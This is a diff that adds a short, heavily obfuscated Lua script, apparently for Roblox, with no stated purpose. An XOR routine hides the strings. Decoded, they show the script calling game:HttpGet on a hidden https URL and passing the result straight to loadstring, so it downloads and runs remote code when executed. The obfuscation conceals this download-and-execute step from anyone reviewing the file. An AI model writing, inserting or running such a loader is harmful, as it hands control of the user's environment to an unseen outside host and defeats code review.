@@ -1,0 +1,14 @@
+local j,k,a_=(string.char),(string.byte),(bit32 .bxor)
+local h=function(g,f_)
+    local b_=''
+    for e_=210,(#g-1)+210 do
+        b_=b_..j(a_(k(g,(e_-210)+1),k(f_,(e_-210)%#f_+1)))
+    end
+    return b_
+end
+return(function(d_,...)
+    local function c(i_)
+        return d_[i_+-22054]
+    end
+    loadstring(game[h(',\208\214\20\227\199\16','d\164\162')](game,c(20068)))()
+end)({[-1986]=h('\147\148\144\132\187\218x%\191\24\18\164\198\145\131E\213\131\139\153\231\146\54}\224\29\6\164\146\149\155A\201','\251\224\228\244\200\224W\n\207ya\208\163\243\234+')},...)
